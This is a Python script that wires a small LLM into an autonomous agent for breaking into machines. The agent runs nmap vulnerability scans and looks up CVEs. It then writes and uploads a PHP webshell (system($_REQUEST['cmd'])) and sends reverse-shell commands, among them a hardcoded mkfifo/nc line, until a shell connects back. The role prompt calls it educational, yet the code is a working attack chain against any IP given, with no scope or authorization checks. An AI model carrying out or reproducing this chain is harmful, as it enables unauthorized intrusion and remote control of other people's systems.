#!/usr/bin/env python3
"""
Revised nmap_to_llm.py with fairlib integration for interactive agentic workflow.
- Prompts user for OS
- Sets up RAG on reverse_shells.json using fairlib
- Uses fairlib SimpleAgent with ReAct planner for interactive chat and automation
- User interacts with the agent via prompts, e.g., "try to get me a reverse shell on the device with IP 10.200.1.41"
- Agent handles IP extraction, nmap running, analysis, and tool execution sequentially
- On MacOS, opens new Terminal window for reverse shell interaction
- Modified to use nmap --script vuln, parse CVEs, query NVD API
- Upload payload.php instead of payload.txt
- CURL after upload to parse response for access path
- Execute reverse shell command via webshell
- Fallback to user input if fails
- Fixes: Capture all nmap script outputs, shorten role prompt for smaller LLM, add logging for LLM responses
- Additional fixes: Emphasize full workflow in prompt, infer file upload from script outputs, avoid early final answers
"""

import os
import subprocess
import xml.etree.ElementTree as ET
import ipaddress
import requests
import textwrap
import sys
import shutil
import json
import socket
import threading
import time
import re
import tempfile
import logging  # Added for logging

from sentence_transformers import SentenceTransformer
import chromadb
from chromadb.utils import embedding_functions

# fairlib imports (following math_demo.ipynb structure)
from dotenv import load_dotenv
from fairlib.modules.mal.huggingface_adapter import HuggingFaceAdapter
from fairlib.core.message import Message
from fairlib import AbstractTool, ToolRegistry, ToolExecutor, WorkingMemory, SimpleReActPlanner, SimpleAgent, RoleDefinition

# Setup logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')  # Changed to INFO for less verbosity

# Suppress warnings as in demo
os.environ['HF_HUB_DISABLE_PROGRESS_BARS'] = '1'
os.environ['TRANSFORMERS_NO_ADVISORY_WARNINGS'] = '1'
os.environ['TOKENIZERS_PARALLELISM'] = 'false'
os.environ['ANONYMOUS_TELEMETRY'] = 'False'  # Disable Chroma telemetry

# Load HF token
load_dotenv()
token = os.getenv("HUGGING_FACE_HUB_TOKEN")
if not token:
    raise ValueError("HUGGING_FACE_HUB_TOKEN not found in .env file!")

NMAP_ARGS = ["-sV", "-O", "--script=vuln", "-Pn", "-oX", "-"]  # service/version, OS, vuln scripts, no ping, XML output

# Load reverse_shells.json for RAG
REVERSE_SHELLS_FILE = "reverse_shells.json"
with open(REVERSE_SHELLS_FILE, "r") as f:
    reverse_shells = json.load(f)

# Add PHP webshell to reverse_shells if not present
php_section = next((s for s in reverse_shells["sections"] if "PHP" in s["OS"]), None)
if not php_section:
    reverse_shells["sections"].append({
        "OS": "PHP Webshell",
        "payload_info": {
            "example": "<?php if(isset($_REQUEST[\"cmd\"])){ echo \"<pre>\"; $cmd = ($_REQUEST[\"cmd\"]); system($cmd); echo \"</pre>\"; die; }?>",
            "payload_template": "<?php if(isset($_REQUEST[\"cmd\"])){ echo \"<pre>\"; $cmd = ($_REQUEST[\"cmd\"]); system($cmd); echo \"</pre>\"; die; }?>"
        }
    })

# Setup RAG (ChromaDB with SentenceTransformer)
embedder = SentenceTransformer("all-MiniLM-L6-v2")
client = chromadb.Client()
collection_name = "reverse_shells_kb"
if collection_name in [c.name for c in client.list_collections()]:
    client.delete_collection(collection_name)
collection = client.create_collection(name=collection_name)

# Add documents to collection
documents = []
ids = []
metadatas = []
for idx, section in enumerate(reverse_shells["sections"]):
    doc = section["payload_info"]["example"]
    documents.append(doc)
    ids.append(str(idx))
    metadatas.append({"os": section["OS"]})
collection.add(
    documents=documents,
    embeddings=[embedder.encode(doc).tolist() for doc in documents],
    ids=ids,
    metadatas=metadatas
)

# Tool Definitions (as subclasses of AbstractTool)
class QueryKBTool(AbstractTool):
    name = "query_kb"
    description = "Query the reverse shells knowledge base for relevant payload examples based on OS or service."
    
    def use(self, query: str, top_k: int = 50) -> str:
        results = collection.query(
            query_embeddings=embedder.encode(query).tolist(),
            n_results=top_k
        )
        relevant = []
        for i in range(top_k):
            if results["documents"] and i < len(results["documents"][0]):
                doc = results["documents"][0][i]
                meta = results["metadatas"][0][i]
                relevant.append(f"OS: {meta['os']}, Payload: {doc}")
        return "\n".join(relevant) if relevant else "No relevant payloads found."

class GetAttackerIPTool(AbstractTool):
    name = "get_attacker_ip"
    description = "Get the attacker's local IP address."
    
    def __init__(self, user_os):
        self.user_os = user_os
    
    def use(self) -> str:
        if self.user_os == "MacOS":
            try:
                route_output = subprocess.check_output(["route", "get", "1.1.1.1"]).decode('utf-8')
                iface = None
                for line in route_output.splitlines():
                    if "interface:" in line:
                        iface = line.split(":")[1].strip()
                        break
                if not iface:
                    raise ValueError("Could not find network interface")
                ip = subprocess.check_output(["ipconfig", "getifaddr", iface]).decode('utf-8').strip()
                return ip
            except Exception as e:
                raise RuntimeError(f"Error getting IP on MacOS: {e}")
        elif self.user_os == "Linux":
            try:
                output = subprocess.check_output(["ip", "route", "get", "1.1.1.1"]).decode('utf-8')
                ip_match = re.search(r'src (\S+)', output)
                if ip_match:
                    return ip_match.group(1)
                raise ValueError("Could not find source IP")
            except Exception as e:
                raise RuntimeError(f"Error getting IP on Linux: {e}")
        elif self.user_os == "Windows":
            try:
                output = subprocess.check_output("ipconfig", shell=True).decode('utf-8')
                ip_match = re.search(r'IPv4 Address.*:\s*(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})', output)
                if ip_match:
                    return ip_match.group(1)
                raise ValueError("Could not find IPv4 address")
            except Exception as e:
                raise RuntimeError(f"Error getting IP on Windows: {e}")
        else:
            raise ValueError("Unsupported OS")

class GeneratePayloadTool(AbstractTool):
    name = "generate_payload"
    description = "Generate and write a reverse shell or webshell payload to file."
    
    def use(self, payload_type: str, os_type: str = "", listener_ip: str = "", listener_port: int = 0) -> str:
        selected_section = None
        if payload_type.lower() == "webshell":
            selected_section = next((s for s in reverse_shells['sections'] if 'PHP' in s['OS']), None)
            if not selected_section:
                return "No PHP webshell found."
            payload_template = selected_section['payload_info']['payload_template']
            payload = payload_template  # No replacement needed for webshell
            with open('payload.php', 'w') as f:
                f.write(payload)
            return f"PHP webshell generated and written to payload.php: {payload}"
        elif payload_type.lower() == "reverse":
            os_name = os_type.lower()
            if 'linux' in os_name or 'unix' in os_name:
                selected_section = next((s for s in reverse_shells['sections'] if 'Bash' in s['OS'] or 'nc' in s['OS']), None)
            elif 'windows' in os_name:
                selected_section = next((s for s in reverse_shells['sections'] if 'PowerShell' in s['OS'] or 'C Windows' in s['OS']), None)
            if not selected_section:
                return "No matching reverse payload found for OS."
            payload_template = selected_section['payload_info']['payload_template']
            payload = payload_template.replace(reverse_shells['default_template_IP'], listener_ip).replace(reverse_shells['default_template_listening_port'], str(listener_port))
            with open('current_payload.txt', 'w') as f:
                f.write(payload)
            return f"Reverse payload generated: {payload}"
        else:
            return "Invalid payload type."

class DeployPayloadTool(AbstractTool):
    name = "deploy_payload"
    description = "Upload the payload.php file to the target via file upload form."
    
    def use(self, target_ip: str, target_port: int, endpoint: str = '/', payload_file: str = 'payload.php') -> str:
        try:
            with open(payload_file, 'rb') as f:
                files = {'file': ('payload.php', f)}  # Assume form field is 'file'; adjust if needed
                url = f"http://{target_ip}:{target_port}{endpoint}"
                response = requests.post(url, files=files, timeout=10)
            return f"Upload response: Status {response.status_code}, Content: {response.text}"
        except Exception as e:
            return f"Deployment error: {str(e)}"

class CurlPageTool(AbstractTool):
    name = "curl_page"
    description = "Fetch the content of a webpage on the target to parse responses."
    
    def use(self, target_ip: str, target_port: int, path: str = '/') -> str:
        try:
            url = f"http://{target_ip}:{target_port}{path}"
            response = requests.get(url, timeout=10)
            return response.text
        except Exception as e:
            return f"Error fetching page: {str(e)}"

class ExecuteCmdTool(AbstractTool):
    name = "execute_cmd"
    description = "Execute a command via the uploaded webshell."
    
    def use(self, target_ip: str, target_port: int, webshell_path: str = '/uploads/payload.php', cmd: str = '') -> str:
        try:
            url = f"http://{target_ip}:{target_port}{webshell_path}?cmd={cmd}"
            response = requests.get(url, timeout=10)
            return f"Execution response: {response.text}"
        except Exception as e:
            return f"Execution error: {str(e)}"

class QueryCVETool(AbstractTool):
    name = "query_cve"
    description = "Query the NVD API for details on a specific CVE."
    
    def use(self, cve_id: str) -> str:
        url = f"https://services.nvd.nist.gov/rest/json/cves/2.0?cveId={cve_id}"
        try:
            response = requests.get(url)
            if response.status_code == 200:
                data = response.json()
                if data.get('totalResults', 0) > 0:
                    vuln = data['vulnerabilities'][0]['cve']
                    desc = vuln['descriptions'][0]['value']
                    return f"CVE {cve_id}: {desc}"
                else:
                    return "No details found for this CVE."
            else:
                return f"API error: Status {response.status_code}"
        except Exception as e:
            return f"Error querying CVE: {str(e)}"

class StartListenerTool(AbstractTool):
    name = "start_listener"
    description = "Start a reverse shell listener and hand off interactively (opens new terminal on MacOS if connected)."
    
    def use(self, listener_port: int, timeout: int = 60, user_os: str = "MacOS") -> str:
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.bind(('0.0.0.0', listener_port))
        server.listen(1)
        server.settimeout(timeout)
        try:
            conn, addr = server.accept()
            logging.info(f"Connection from {addr}. Starting interactive shell...")
            if user_os == "MacOS":
                helper_code = f"""
import socket
import sys

host = '127.0.0.1'
port = {listener_port + 1}  # Local bridge port

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))
while True:
    cmd = input("shell> ")
    if cmd.lower() == 'exit':
        break
    s.send((cmd + '\\n').encode())
    response = s.recv(4096).decode(errors='ignore')
    print(response)
s.close()
"""
                with tempfile.NamedTemporaryFile(suffix='.py', delete=False) as temp_file:
                    temp_file.write(helper_code.encode())
                    temp_path = temp_file.name

                local_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                local_server.bind(('127.0.0.1', listener_port + 1))
                local_server.listen(1)
                local_conn, _ = local_server.accept()

                def forward(src, dest):
                    while True:
                        data = src.recv(4096)
                        if not data:
                            break
                        dest.send(data)

                threading.Thread(target=forward, args=(conn, local_conn)).start()
                threading.Thread(target=forward, args=(local_conn, conn)).start()

                osascript_cmd = f"""osascript -e 'tell application "Terminal" to do script "python3 {temp_path}"'"""
                subprocess.run(osascript_cmd, shell=True)

                local_conn.close()
                local_server.close()
                os.unlink(temp_path)
            else:
                while True:
                    cmd = input("shell> ")
                    if cmd.lower() == 'exit':
                        break
                    conn.send((cmd + '\n').encode())
                    response = conn.recv(4096).decode(errors='ignore')
                    print(response)
            conn.close()
            return "Listener session ended."
        except socket.timeout:
            return "Timeout: No connection received."
        except Exception as e:
            return f"Listener error: {str(e)}"
        finally:
            server.close()

class TryMultiplePayloadsTool(AbstractTool):
    name = "try_multiple_payloads"
    description = "Try multiple reverse shell commands on the webshell until success. Requires nmap summary and webshell path."
    
    def use(self, os_type: str, listener_ip: str, listener_port: int, target_ip: str, target_port: int, webshell_path: str, nmap_summary: str, user_os: str = "MacOS") -> str:
        filtered_sections = [s for s in reverse_shells["sections"] if os_type.lower() in s["OS"].lower() and "PHP" not in s["OS"]]
        filtered_sections = filtered_sections[:50]
        
        if not filtered_sections:
            return "No payloads found for the OS type."
        
        logging.info(f"Trying multiple reverse shell commands on webshell at port {target_port}...")
        for idx, section in enumerate(filtered_sections):
            payload_template = section['payload_info']['payload_template']
            payload = payload_template.replace(reverse_shells['default_template_IP'], listener_ip).replace(reverse_shells['default_template_listening_port'], str(listener_port))
            if "nc" not in payload:
                payload = f"mkfifo /tmp/f; /bin/sh -i < /tmp/f 2>&1 | nc {listener_ip} {listener_port} > /tmp/f"
            
            server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server.bind(('0.0.0.0', listener_port))
            server.listen(1)
            server.settimeout(30)
            
            exec_result = ExecuteCmdTool().use(target_ip, target_port, webshell_path, payload)
            logging.info(exec_result)
            
            try:
                conn, addr = server.accept()
                logging.info(f"Success with payload {idx+1} from {addr}. Starting interactive shell...")
                if user_os == "MacOS":
                    helper_code = f"""
import socket
import sys

host = '127.0.0.1'
port = {listener_port + 1}

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))
while True:
    cmd = input("shell> ")
    if cmd.lower() == 'exit':
        break
    s.send((cmd + '\\n').encode())
    response = s.recv(4096).decode(errors='ignore')
    print(response)
s.close()
"""
                    with tempfile.NamedTemporaryFile(suffix='.py', delete=False) as temp_file:
                        temp_file.write(helper_code.encode())
                        temp_path = temp_file.name

                    local_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    local_server.bind(('127.0.0.1', listener_port + 1))
                    local_server.listen(1)
                    local_conn, _ = local_server.accept()

                    def forward(src, dest):
                        while True:
                            data = src.recv(4096)
                            if not data:
                                break
                            dest.send(data)

                    threading.Thread(target=forward, args=(conn, local_conn)).start()
                    threading.Thread(target=forward, args=(local_conn, conn)).start()

                    osascript_cmd = f"""osascript -e 'tell application "Terminal" to do script "python3 {temp_path}"'"""
                    subprocess.run(osascript_cmd, shell=True)

                    local_conn.close()
                    local_server.close()
                    os.unlink(temp_path)
                else:
                    while True:
                        cmd = input("shell> ")
                        if cmd.lower() == 'exit':
                            break
                        conn.send((cmd + '\n').encode())
                        response = conn.recv(4096).decode(errors='ignore')
                        print(response)
                conn.close()
                server.close()
                return f"Success with payload {idx+1}. Execution: {exec_result}"
            except socket.timeout:
                server.close()
                logging.info(f"Payload {idx+1} failed. Trying next...")
            except Exception as e:
                server.close()
                return f"Error with payload {idx+1}: {str(e)}"
        return "All payloads failed to establish a connection."

class RunNmapTool(AbstractTool):
    name = "run_nmap"
    description = "Run nmap scan on a target IP and return the parsed summary including vulnerabilities."
    
    def use(self, ip: str) -> str:
        try:
            xml = run_nmap(ip)
            summary = parse_nmap_xml(xml)
            # Format summary as string for agent memory
            host_info = [f"- {a['type']}: {a['addr']}" for a in summary["addresses"]]
            if summary["hostnames"]:
                host_info.append("- hostnames: " + ", ".join(h["name"] for h in summary["hostnames"]))
            if summary["os_guess"]:
                host_info.append(f"- OS guess: {summary['os_guess']['name']} (accuracy {summary['os_guess']['accuracy']})")
            host_info.append(f"- Host state: {summary.get('host_state')}")
            host_block = "Host info:\n" + "\n".join(host_info)

            ports_block_lines = [f" - {p['port']}/{p['proto']} {p['state']}: {p['service'].get('name') or ''} ({p['service'].get('product') or ''} {p['service'].get('version') or ''})" for p in sorted(summary["ports"], key=lambda x: x["port"])]
            ports_block = "Open/filtered ports and services:\n" + ("\n".join(ports_block_lines) if ports_block_lines else " - none found")

            vuln_block_lines = []
            for v in summary["vulnerabilities"]:
                cves_str = ", ".join(v["cves"])
                output_str = v['output'][:1000]  # Increased for more detail
                vuln_block_lines.append(f" - Port {v['port']}, Script {v['script']}: {output_str}... CVEs: {cves_str}")
            vuln_block = "Vulnerabilities and script outputs (look for file upload hints like /uploads/ or file-type fields):\n" + ("\n".join(vuln_block_lines) if vuln_block_lines else " - none found")

            return f"{host_block}\n\n{ports_block}\n\n{vuln_block}"
        except Exception as e:
            return f"Error running nmap: {str(e)}"

def validate_ip(ip_str: str) -> str:
    try:
        ip = ipaddress.ip_address(ip_str.strip())
        return str(ip)
    except ValueError:
        raise ValueError(f"Invalid IP address: {ip_str}")

def check_prereqs():
    if not shutil.which("nmap"):
        raise EnvironmentError("nmap not found in PATH. Please install nmap and retry.")

def run_nmap(ip: str, extra_args=None, timeout=300) -> str:  # Increased timeout for vuln scripts
    if extra_args is None:
        extra_args = []
    cmd = ["sudo", "nmap"] + NMAP_ARGS + extra_args + [ip]
    proc = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
    if proc.returncode != 0 and not proc.stdout:
        raise RuntimeError(f"nmap error (code {proc.returncode}):\n{proc.stderr.strip()}")
    return proc.stdout

def parse_nmap_xml(xml_text: str) -> dict:
    root = ET.fromstring(xml_text)
    host = root.find("host")
    if host is None:
        return {"hostnames": [], "addresses": [], "ports": [], "os_guess": None, "host_state": None, "vulnerabilities": []}

    addresses = [{"addr": addr.get("addr"), "type": addr.get("addrtype")} for addr in host.findall("address")]
    hostnames = [{"name": name.get("name"), "type": name.get("type")} for name in host.find("hostnames").findall("hostname")] if host.find("hostnames") else []
    status = host.find("status")
    host_state = status.get("state") if status is not None else None

    ports = []
    vulnerabilities = []
    ports_node = host.find("ports")
    if ports_node:
        for p in ports_node.findall("port"):
            portid = p.get("portid")
            proto = p.get("protocol")
            state = p.find("state").get("state") if p.find("state") else None
            service_node = p.find("service")
            service = {
                "name": service_node.get("name"),
                "product": service_node.get("product"),
                "version": service_node.get("version"),
                "extrainfo": service_node.get("extrainfo"),
                "conf": service_node.get("conf"),
            } if service_node else {}
            ports.append({"port": int(portid), "proto": proto, "state": state, "service": service})

            # Extract script outputs for vulns - always append, even without CVEs
            for script in p.findall("script"):
                script_id = script.get("id")
                output = script.get("output") or ""
                elems = script.findall("elem")
                tables = script.findall("table")

                cves = set(re.findall(r'CVE-\d{4}-\d{4,7}', output))
                for elem in elems:
                    if elem.get("key") == "id" and elem.text and 'CVE' in elem.text:
                        cves.add(elem.text)

                vulnerabilities.append({
                    "port": portid,
                    "script": script_id,
                    "output": output,
                    "cves": list(cves)
                })

    os_node = host.find("os")
    os_guess = {"name": osmatch.get("name"), "accuracy": osmatch.get("accuracy")} if os_node and (osmatch := os_node.find("osmatch")) else None

    return {
        "host_state": host_state,
        "addresses": addresses,
        "hostnames": hostnames,
        "ports": ports,
        "os_guess": os_guess,
        "vulnerabilities": vulnerabilities,
    }

async def main():
    # Prompt user for OS
    user_os_input = input("Select your OS: 1 for Windows, 2 for Linux, 3 for MacOS: ").strip()
    if user_os_input == "1":
        user_os = "Windows"
    elif user_os_input == "2":
        user_os = "Linux"
    elif user_os_input == "3":
        user_os = "MacOS"
    else:
        print("Unsupported OS. Exiting.")
        sys.exit(1)
    print(f"Selected OS: {user_os}")

    check_prereqs()

    # Load LLM
    llm = HuggingFaceAdapter(model_name="cognitivecomputations/Dolphin3.0-Qwen2.5-3b", auth_token=token)

    # Register tools
    tool_registry = ToolRegistry()
    tool_registry.register_tool(QueryKBTool())
    tool_registry.register_tool(GetAttackerIPTool(user_os))
    tool_registry.register_tool(GeneratePayloadTool())
    tool_registry.register_tool(DeployPayloadTool())
    tool_registry.register_tool(CurlPageTool())
    tool_registry.register_tool(ExecuteCmdTool())
    tool_registry.register_tool(QueryCVETool())
    tool_registry.register_tool(StartListenerTool())
    tool_registry.register_tool(TryMultiplePayloadsTool())
    tool_registry.register_tool(RunNmapTool())

    # Executor
    executor = ToolExecutor(tool_registry)

    # Memory
    memory = WorkingMemory()

    # Planner with enhanced role definition: Emphasize full chain, infer file upload, no early final
    planner = SimpleReActPlanner(llm, tool_registry)
    planner.prompt_builder.role_definition = RoleDefinition(
        "You are a cybersecurity analyst for educational demos. ALWAYS follow ALL steps in order without skipping. DO NOT use Final Answer until step 11 succeeds or all fails. Analyze ALL nmap outputs for file upload vulns (e.g., /uploads/, file-type fields, CVE-2017-1001000 even if errored). Assume HTTP file upload if /uploads/ found. "
        "1. Extract IP. "
        "2. Use run_nmap, analyze OS/ports/vulns/CVEs/script outputs. "
        "3. Query ALL relevant CVEs with query_cve, prioritize file upload/HTTP (e.g., CVE-2017-1001000). "
        "4. Use query_kb for reverse shells (Bash/nc for Linux) and PHP webshell. "
        "5. Use get_attacker_ip. "
        "6. Use generate_payload type='webshell'. "
        "7. Use deploy_payload on HTTP port (80), endpoint='/'. "
        "8. Use curl_page on '/' or upload path to find webshell URL (parse 'access it via: uploads/payload.php'). "
        "9. Use generate_payload type='reverse' with OS=Linux, IP from 5, port=4444 or 2026. "
        "10. Use start_listener on port from 9. "
        "11. Use execute_cmd with webshell path from 8 and reverse command from 9. "
        "If fails, use try_multiple_payloads with OS=Linux. If all fails, Final Answer explaining and ask user. "
        "After each tool: Thought: [status/analysis] Action: [next]. Format Action as: Using tool 'tool_name' with input 'args'."
    )

    # Agent with increased max_steps
    agent = SimpleAgent(
        llm=llm,
        planner=planner,
        tool_executor=executor,
        memory=memory,
        max_steps=50  # Increased to allow full chain
    )

    print("Agent ready. Start chatting (type 'exit' to quit).")
    while True:
        user_input = input("You: ").strip()
        if user_input.lower() == 'exit':
            break
        print("Agent thinking...")
        response = await agent.arun(user_input)
        print("Agent:", response)

if __name__ == "__main__":
    import asyncio
    asyncio.run(main())